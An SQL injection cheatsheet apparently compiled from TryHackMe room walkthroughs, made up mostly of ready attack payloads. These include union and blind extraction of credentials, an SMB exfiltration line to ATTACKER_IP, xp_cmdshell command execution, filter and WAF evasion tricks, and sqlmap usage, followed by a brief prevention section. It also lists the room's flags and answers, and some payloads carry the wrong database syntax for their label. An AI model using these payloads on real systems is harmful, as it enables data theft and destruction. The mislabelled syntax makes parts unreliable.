# Advanced SQL Injection Cheatsheet

**Author:** Grok (Compiled from TryHackMe Room Walkthroughs)  
**Purpose:** Educational resource for cybersecurity students and bug hunters. Focuses on advanced SQLi techniques, payloads, and evasion.  
**Disclaimer:** For authorized penetration testing and learning only. Do not use on systems without permission.

## Overview
SQL Injection (SQLi) is a code injection technique exploiting untrusted data in dynamic SQL queries. Advanced SQLi builds on basics by evading filters, using indirect channels, and targeting stored data.

- **Key Risks:** Data exfiltration, modification, deletion, or RCE.
- **Common Databases:** MySQL/MariaDB, MSSQL, Oracle, PostgreSQL.
- **Prerequisites:** Basic SQL knowledge, tools like Burp Suite or sqlmap.
- **Port for MySQL:** 3306

## SQL Injection Types

### In-Band SQL Injection
Uses the same channel (e.g., HTTP response) for injection and data retrieval. Fastest but detectable.

#### Error-Based SQLi
Forces database errors to leak info (e.g., table structure, versions).

- **Example Payload (MySQL):**  
  `1' AND 1=CONVERT(int, (SELECT @@version))--`  
  *Result:* Error message reveals `@@version` (e.g., "10.4.24-MariaDB").

- **MySQL Error Code for Invalid Query:** 1064  
- **Use Case:** Extract book details: `1' AND (SELECT * FROM books WHERE id=6)--` (leaks "Animal Series").

#### Union-Based SQLi
Appends `UNION SELECT` to merge results from other tables.

- **Example Payload:**  
  `1' UNION SELECT username, password FROM users--`  
  *Result:* Dumps credentials alongside legitimate results.

### Inferential (Blind) SQLi
No direct data return; infers via app behavior (e.g., page load time/content).

#### Boolean-Based Blind SQLi
Tests true/false conditions; observes response changes.

- **True Payload:** `1' AND 1=1--` (normal page).  
- **False Payload:** `1' AND 1=2--` (error/empty page).  
- **Extraction Example (Password for "attacker"):**  
  `1' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='attacker')='t'--`  
  *Answer:* "tesla" (iterates chars).  
- **Bypass SELECT Ban:** Use subqueries or alternatives (e.g., Option C: `CASE WHEN ...`).

#### Time-Based Blind SQLi
Uses delays to confirm conditions.

- **Example Payload (MySQL):**  
  `1'; IF(1=1, SLEEP(5), 0)--` (5s delay = true).  
- **System Info Extraction:**  
  - `@@version`: "10.4.24-MariaDB"  
  - `@@basedir`: "C:/xampp/mysql"  
- **MSSQL Variant:** `1'; IF(1=1) WAITFOR DELAY '00:00:05'--`

### Out-of-Band (OOB) SQLi
Exfiltrates data via external channels (e.g., HTTP/DNS/SMB). Bypasses WAFs.

- **Common Protocol:** HTTP  
- **MySQL Example (SMB Exfil):**  
  `1'; SELECT @@version INTO OUTFILE '\\\\ATTACKER_IP\\logs\\out.txt'--`  
  *Setup:* Use `smbserver.py` on Kali/AttackBox.  
- **HTTP Header Exfil:**  
  Target logged headers like User-Agent:  
  `' UNION SELECT username, password FROM users--`  
  *curl:* `curl -H "User-Agent: ' UNION SELECT username, password FROM users--" http://target/`  
- **Flag Example:** `THM{HELLO}` from `books` table (book_id=1).  
- **Detected Field:** User-Agent

### Second-Order SQLi
Stored payloads execute later (e.g., on update/retrieval). Stealthy, evades initial validation.

- **Scenario:** Insert via escaped query, trigger on unescaped update.  
- **Payload (SSN Field):** `12345'; UPDATE books SET book_name='compromised'; --`  
- **Result Flags:**  
  - After title update: `THM{SO_HACKED}`  
  - After `DROP TABLE hello`: `THM{Table_Dropped}`  
- **Code Insight (PHP/MySQL):**  
  ```php:disable-run
  // Vulnerable Update (No Escaping)
  $update_sql = "UPDATE books SET book_name = '$new_book_name' WHERE ssn = '$ssn'";
  ```

## Filter Evasion Techniques
Bypass WAFs, sanitization, or keyword bans.

| Technique | Description | Example Payload |
|-----------|-------------|-----------------|
| **Case Variation** | Change keyword casing. | `SeLeCt * FrOm UsErS` |
| **Comments** | Insert `/**/` to split keywords. | `SEL/**/ECT * F/**/ROM users` |
| **URL Encoding** | Encode chars (e.g., `%27` for `'`). | `1%27%20OR%201=1--` |
| **Hex Encoding** | Use `0x` for strings. | `0x61646d696e` ("admin") |
| **Unicode Encoding** | Use `\uXXXX`. | `\u0061\u0064\u006d\u0069\u006e` ("admin") |
| **No Quotes** | Numerical or CONCAT. | `OR 1=1` or `CONCAT(0x61,0x64,0x6d,0x69,0x6e)` |
| **No Spaces** | Use `%0A` (newline), `%09` (tab), or `/**/`. | `SELECT%0A*%0AFROM%0Ausers` |
| **Logical Ops Ban** | Use `||` instead of `OR`. | `1' || 1=1--` |

- **Banned SELECT Bypass:** `CASE WHEN (condition) THEN 1 ELSE 0 END`  
- **Example (Space Ban):** `1'%0A||%0A1=1%0A--`  

## Advanced Exploitation
- **HTTP Header Injection:** Inject via `User-Agent` if logged unsafely.  
- **Stored Procedures (MSSQL):**  
  ```sql
  EXEC sp_getUserData 'admin'' OR ''1''= ''1'
  ```  
  *RCE Command:* `xp_cmdshell` (e.g., `EXEC xp_cmdshell 'whoami'`)  
- **XML/JSON Injection:**  
  ```json
  {"username": "admin' OR '1'='1--"}
  ```

## Tools
| Tool | Description | Usage Example |
|------|-------------|---------------|
| **sqlmap** | Automates detection/exploitation. | `sqlmap -u "http://target/search.php?q=1" --dbs` |
| **SQLNinja** | MSSQL-focused exploitation. | `sqlninja -m upload` (for UDF upload) |
| **Burp Suite** | Manual testing/interception. | Intercept requests, inject payloads. |
| **Impacket (smbserver.py)** | OOB exfil via SMB. | `smbserver.py logs /tmp` |

## Prevention Techniques
- **Parameterized Queries/Prepared Statements:** Use placeholders (e.g., `?` in PDO).  
  ```php
  $stmt = $conn->prepare("SELECT * FROM users WHERE id = ?");
  $stmt->bind_param("i", $id);
  ```
- **Stored Procedures with Params:** Avoid dynamic SQL concatenation.  
- **Input Validation:** Whitelist/sanitize inputs (e.g., `real_escape_string()` + type checks).  
- **ORMs:** Use Entity Framework or Hibernate to abstract queries.  
- **WAFs:** Deploy ModSecurity; monitor for anomalies.  
- **Least Privilege:** Limit DB user perms (no DROP/UPDATE).  
- **Escape Output:** For second-order, escape on retrieval too.  
- **Dynamic Query Detection:** SQLi identification is hard; audit code manually.

## References & Flags from Room
- **Sample Flags:** `THM{HELLO}`, `THM{SO_HACKED}`, `THM{Table_Dropped}`  
- **Sources:** TryHackMe Room, Medium/DEV.to Walkthroughs  
- **Further Reading:** OWASP SQL Injection Cheat Sheet, PortSwigger WebSec Academy.

---

*Last Updated: October 10, 2025. Practice on legal labs like TryHackMe/PortSwigger.*
```
